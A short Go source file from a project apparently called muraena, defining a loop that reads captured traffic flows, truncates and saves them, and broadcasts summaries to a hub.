package traffic

import (
	"github.com/muraenateam/muraena/core/capture"
	"github.com/muraenateam/muraena/session"
)

// StartConsumer drains captured flows, persists them, and broadcasts summaries.
// Runs until the process exits; launch it in a goroutine.
func StartConsumer(sess *session.Session, hub *Hub) {
	for f := range capture.Flows() {
		tc := sess.Config().Api.Traffic
		Truncate(&f, tc.MaxBodyKB)
		if err := Save(f, tc.MaxFlows, tc.TTLMinutes); err != nil {
			continue
		}
		hub.Broadcast(SummaryOf(f))
	}
}
